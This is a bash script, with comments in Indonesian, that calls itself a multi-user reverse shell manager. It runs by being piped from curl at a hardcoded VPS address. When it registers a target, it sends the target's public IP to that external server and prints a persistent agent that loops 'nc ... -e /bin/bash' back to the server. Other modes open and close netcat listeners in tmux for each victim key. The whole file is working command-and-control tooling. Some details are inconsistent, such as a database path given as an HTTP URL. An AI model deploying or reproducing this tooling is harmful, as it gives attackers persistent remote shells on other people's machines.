#!/usr/bin/env bash
#
# =========================================================
#  MULTI-USER REVERSE SHELL MANAGER (Proof-of-Concept)
#  Menggunakan db_api.php untuk mode INSTALL
#  (Data dikirim ke API, lalu disimpan juga di DB lokal)
# =========================================================
#  Modes:
#   1) INSTALL : X="secretKey" bash -c "$(curl -fsSL http://IP_VPS/script.sh)"
#   2) CONNECT : S="secretKey" bash -c "$(curl -fsSL http://IP_VPS/script.sh)"
#   3) LIST    : LIST=1 bash -c "$(curl -fsSL http://IP_VPS/script.sh)"
#   4) KILL    : K="secretKey" bash -c "$(curl -fsSL http://IP_VPS/script.sh)"
# =========================================================

# ----------------------------
# 1) Menentukan Path Database
# ----------------------------
SCRIPT_PATH="$(readlink -f "$0")"
SCRIPT_DIR="$(dirname "$SCRIPT_PATH")"
DB_FILE="http://45.76.182.111/multi_reverse_db.csv"

# ----------------------------
# 2) Konfigurasi Lain
# ----------------------------
VPS_IP="45.76.182.111"     # Ganti dengan IP/domain VPS Anda
DB_API_URL="http://45.76.182.111/db_api.php"  # Endpoint API di VPS
PORT_MIN=30000
PORT_MAX=40000

# Pastikan tool yang diperlukan terinstall di VPS:
#  - netcat (nc) versi "tradisional" atau ncat
#  - tmux
#  - (opsional) date, grep, awk, sed

# ----------------------------
# 3) Fungsi Pembantu
# ----------------------------
generate_port() {
  # Sudah tidak kita pakai di mode_install, 
  # tetapi masih ada jika sewaktu-waktu dibutuhkan
  shuf -i ${PORT_MIN}-${PORT_MAX} -n 1
}

timestamp_now() {
  date "+%Y-%m-%d %H:%M:%S"
}

init_db() {
  if [ ! -f "$DB_FILE" ]; then
    touch "$DB_FILE"
  fi
}

save_record() {
  # Param: $1=key, $2=targetIP, $3=port, $4=status, $5=pid
  local createdAt
  createdAt="$(timestamp_now)"
  echo "$1,$2,$3,$4,$5,$createdAt" >> "$DB_FILE"
}

update_record() {
  local key="$1"
  local fieldIndex="$2"
  local newValue="$3"
  if [ ! -f "$DB_FILE" ]; then
    echo "[ERROR] DB file not found ($DB_FILE)."
    return 1
  fi

  local escapedKey
  escapedKey="$(echo "$key" | sed 's/[]\/$*.^|[]/\\&/g')"
  local escapedValue
  escapedValue="$(echo "$newValue" | sed 's/[]\/$*.^|[]/\\&/g')"

  awk -F, -v k="$key" -v f="$fieldIndex" -v val="$escapedValue" 'BEGIN {OFS=","} {
    if ($1 == k) {
      $f = val
    }
    print $0
  }' "$DB_FILE" > "${DB_FILE}.tmp" && mv "${DB_FILE}.tmp" "$DB_FILE"
}

find_record_by_key() {
  local key="$1"
  if [ ! -f "$DB_FILE" ]; then
    return
  fi
  grep "^${key}," "$DB_FILE" | tail -n 1
}

get_field() {
  local record="$1"
  local index="$2"
  echo "$record" | cut -d',' -f "$index"
}

tmux_session_exists() {
  local sessionName="$1"
  tmux ls 2>/dev/null | grep -q "^${sessionName}:"
}

# ----------------------------
# 4) Mode: INSTALL
# ----------------------------
mode_install() {
  local key="$1"
  echo "[INFO] === MODE INSTALL: Key=$key ==="

  # 4a. Dapatkan IP publik pengeksekusi (bisa web1.com)
  local targetIP
  targetIP="$(curl -s ifconfig.me || echo "UNKNOWN_IP")"

  # 4b. Kirim data ke API di VPS (db_api.php) untuk mendapatkan port
  echo "[INFO] Mengirim data ke API: key=$key, ip=$targetIP => $DB_API_URL"
  local response
  response="$(curl -s -X POST -d "key=$key" -d "ip=$targetIP" "$DB_API_URL")"

  # 4c. Coba parse respons JSON. 
  #     (Jika punya 'jq', bisa lebih rapi. Di sini kita pakai sed/grep sederhana.)
  echo "[DEBUG] Response API => $response"

  # Ambil field "port" dari respons
  local assignedPort
  assignedPort="$(echo "$response" | sed -n 's/.*"port":\([0-9]*\).*/\1/p')"

  if [ -z "$assignedPort" ]; then
    echo "[ERROR] Gagal mengambil 'port' dari respons API."
    echo "Respons: $response"
    exit 1
  fi

  # 4d. Simpan data ke DB lokal (agar CONNECT / LIST / KILL dapat berfungsi)
  init_db

  # Cek jika key sudah ada. Kita overwrite.
  local existing
  existing="$(find_record_by_key "$key")"
  if [ -n "$existing" ]; then
    echo "[WARN] Key '$key' sudah ada di DB lokal. Overwrite data..."
    update_record "$key" 2 "$targetIP"
    update_record "$key" 3 "$assignedPort"
    update_record "$key" 4 "STOPPED"
    update_record "$key" 5 "-"
  else
    save_record "$key" "$targetIP" "$assignedPort" "STOPPED" "-"
  fi

  # 4e. Tampilkan info agen
  cat <<EOF
[INFO] Berhasil mendaftarkan Key='$key' dengan IP='$targetIP' (via API).
[INFO] Port assigned = $assignedPort

=== PETUNJUK AGENT ===
Berikut contoh agen yang dapat Anda jalankan di sisi target (misal: /tmp/agent.sh):

-------------------------------------------------
#!/usr/bin/env bash

while true; do
  # Tunggu 10 detik sebelum mencoba konek
  sleep 10
  nc ${VPS_IP} ${assignedPort} -e /bin/bash
done
-------------------------------------------------

1. Simpan skrip di /tmp/agent.sh
2. chmod +x /tmp/agent.sh
3. Jalankan: nohup /tmp/agent.sh &

Setiap kali VPS buka listener (CONNECT Mode) untuk Key=$key,
agen di target akan menelpon balik ke port ${assignedPort}.
EOF
}

# ----------------------------
# 5) Mode: CONNECT
# ----------------------------
mode_connect() {
  local key="$1"
  echo "[INFO] === MODE CONNECT: Key=$key ==="

  init_db
  local record
  record="$(find_record_by_key "$key")"
  if [ -z "$record" ]; then
    echo "[ERROR] Key '$key' tidak ditemukan di database ($DB_FILE)."
    exit 1
  fi

  local targetIP port status pid
  targetIP="$(get_field "$record" 2)"
  port="$(get_field "$record" 3)"
  status="$(get_field "$record" 4)"
  pid="$(get_field "$record" 5)"

  echo "[INFO] -> targetIP=$targetIP ; assignedPort=$port ; status=$status"

  local sessionName="rs_${key}"
  if tmux_session_exists "$sessionName"; then
    echo "[WARN] Session '$sessionName' sudah berjalan. Mungkin listener sudah aktif."
    echo "       Silakan KILL terlebih dahulu jika ingin restart."
    echo "       Atau attach ke session: tmux attach -t $sessionName"
    exit 0
  fi

  echo "[INFO] Membuka listener (nc) di port $port, session tmux=$sessionName"
  tmux new -d -s "$sessionName" "nc -lvkp $port"

  update_record "$key" 4 "LISTENING"
  update_record "$key" 5 "$sessionName"

  echo "[INFO] Listener aktif. Silakan pastikan agen di target berjalan."
  echo "[INFO] Untuk melihat session netcat: tmux attach -t $sessionName"
  echo "[INFO] Tekan Ctrl+B+D (atau Ctrl+AD) untuk detach kembali."
}

# ----------------------------
# 6) Mode: LIST
# ----------------------------
mode_list() {
  echo "=== DAFTAR KEY DI DATABASE ==="
  init_db

  if [ ! -s "$DB_FILE" ]; then
    echo "[INFO] Belum ada data. (DB kosong) => $DB_FILE"
    exit 0
  fi

  echo "KEY, IP, PORT, STATUS, PID/TMUX_SESSION, CREATED_AT"
  cat "$DB_FILE"
}

# ----------------------------
# 7) Mode: KILL
# ----------------------------
mode_kill() {
  local key="$1"
  echo "[INFO] === MODE KILL: Key=$key ==="

  init_db
  local record
  record="$(find_record_by_key "$key")"
  if [ -z "$record" ]; then
    echo "[ERROR] Key '$key' tidak ditemukan di database ($DB_FILE)."
    exit 1
  fi

  local status pid
  status="$(get_field "$record" 4)"
  pid="$(get_field "$record" 5)"

  if [ "$status" != "LISTENING" ]; then
    echo "[WARN] Status key='$key' bukan LISTENING. status=$status"
    echo "       Mungkin listener sudah mati."
    exit 0
  fi

  local sessionName="$pid"
  if tmux_session_exists "$sessionName"; then
    echo "[INFO] Menutup tmux session '$sessionName' ..."
    tmux kill-session -t "$sessionName" 2>/dev/null
    update_record "$key" 4 "STOPPED"
    update_record "$key" 5 "-"
    echo "[INFO] Listener untuk key=$key berhasil dimatikan."
  else
    echo "[WARN] Tmux session '$sessionName' tidak ditemukan. Update status ke STOPPED."
    update_record "$key" 4 "STOPPED"
    update_record "$key" 5 "-"
  fi
}

# ----------------------------
# 8) MAIN
# ----------------------------
main() {
  if [ -n "$X" ]; then
    mode_install "$X"
  elif [ -n "$S" ]; then
    mode_connect "$S"
  elif [ -n "$LIST" ]; then
    mode_list
  elif [ -n "$K" ]; then
    mode_kill "$K"
  else
    cat <<EOF
[Usage]:
  # 1) Install/Daftar Key di Target (via db_api.php):
     X="mySecretKey" bash -c "\$(curl -fsSL http://${VPS_IP}/script.sh)"

  # 2) Jalankan Listener di VPS (CONNECT):
     S="mySecretKey" bash -c "\$(curl -fsSL http://${VPS_IP}/script.sh)"

  # 3) List semua key & status:
     LIST=1 bash -c "\$(curl -fsSL http://${VPS_IP}/script.sh)"

  # 4) Kill/Matikan listener tertentu:
     K="mySecretKey" bash -c "\$(curl -fsSL http://${VPS_IP}/script.sh)"

[INFO] File database disimpan di: $DB_FILE
[INFO] API DB URL: $DB_API_URL
EOF
  fi
}

main "$@"
